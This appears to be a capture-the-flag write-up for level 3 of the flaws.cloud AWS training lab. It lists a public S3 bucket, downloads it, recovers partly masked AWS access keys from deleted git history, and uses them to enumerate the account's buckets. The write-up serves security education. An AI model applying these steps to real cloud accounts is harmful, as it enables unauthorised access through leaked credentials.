# Level 3

http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/

<img width="847" height="762" alt="image" src="https://github.com/user-attachments/assets/8d6b5d74-c12f-49c8-9968-23db3ad248db" />

We tried listing the bucket: 

```
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud                
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

Seeing there a `.git/` repository, we can add a `cp --recursive` to our bucket and download the files into our directory to investigate.
```
aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
```
<img width="1493" height="623" alt="image" src="https://github.com/user-attachments/assets/e1e4f8cd-7bc2-4f92-9d51-66304d8752fe" />

```
git log                                                     
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```
```
git log -p
<SNIP>
diff --git a/access_keys.txt b/access_keys.txt
new file mode 100644
index 0000000..e3ae6dd
--- /dev/null
+++ b/access_keys.txt
@@ -0,0 +1,2 @@
+access_key AKXXXXXXXXXXXXXXX7SA
+secret_access_key OdNXXXXXXXXXXXXXXXXXXXXXX3Jys
diff --git a/authenticated_users.png b/authenticated_users.png
new file mode 100644
index 0000000..76e4934
<SNIP>
```

```
export AWS_ACCESS_KEY_ID=AXXXXXXXXXXXXXXXXXXX7SA                                                                                  
```
```                                                                                                                                                                                                                                           
export AWS_SECRET_ACCESS_KEY='OdNaXXXXXXXXXXXXXXXXXXXXXX3Jys'
```
```                                                                                                                                                                                                                                           
export AWS_DEFAULT_REGION='us-west-2'
```
```                                                                                                                                                                                                                                         
aws sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "97XXXXXXX29",
    "Arn": "arn:aws:iam::97XXXXXXX29:user/backup"
}
```
```                                                                                                                                                                                                                                           
 aws s3 ls                                                         
2026-04-28 07:44:51 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2026-04-28 07:31:10 config-bucket-975426262029
2026-04-24 13:21:36 flaws-logs
2026-04-28 09:20:23 flaws.cloud
2026-04-24 17:54:29 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2026-04-27 10:14:25 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2026-04-27 16:28:40 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2026-04-27 16:05:20 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2026-04-24 15:33:12 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2026-04-24 17:46:53 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```














